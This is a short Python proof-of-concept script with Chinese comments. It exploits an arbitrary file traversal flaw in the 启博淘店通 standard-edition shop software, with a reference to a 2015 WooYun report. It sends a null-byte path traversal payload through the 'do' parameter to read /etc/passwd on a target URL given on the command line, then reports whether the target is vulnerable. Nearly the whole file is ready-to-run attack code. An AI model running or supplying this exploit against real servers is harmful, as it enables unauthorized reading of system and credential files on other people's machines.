#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 启博淘店通标准版任意文件遍历漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0148274
author: Lucifer
description: /?mod=goods&do=index&class_id=25,参数do未过滤存在任意文件遍历。
'''
import sys
import requests
import warnings
def run(url):
        result = ['启博淘店通标准版任意文件遍历漏洞','','']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/?mod=goods&do=../../../../../../../../../etc/passwd%00.jpg&class_id=25"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"root:" in req.text and r"/bin/bash" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    